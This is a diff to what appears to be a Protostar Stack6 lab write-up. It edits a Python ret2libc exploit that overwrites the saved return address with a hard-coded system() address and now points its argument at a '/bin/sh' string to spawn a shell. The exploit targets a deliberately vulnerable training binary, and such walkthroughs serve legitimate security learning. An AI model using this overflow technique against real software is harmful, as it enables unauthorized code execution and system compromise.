@@ -407,8 +407,9 @@ fuzz="/bin/sh\x00CCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRR
 ebp="TTTT"
 eip="\xb0\xff\xec\xb7"  #  process virtual address mapping for system which we just have get it now :)
 ret="\xc0\x60\xec\xb7" # process virtual address which we get for exit function
-message_addr="\x7c\xf7\xff\xbf" # 0xbffff77c address for "Hello Iam Sysc4ll3r :)"                
-print(fuzz+ebp+eip+ret+message_addr)
+cmd_addr="\x7c\xf7\xff\xbf" # 0xbffff77c address for string "/bin/sh"                
+
+print(fuzz+ebp+eip+ret+cmd_addr)
 ```
 
 ![Stack6](/assets/img/protostar/stack6-solved.png)
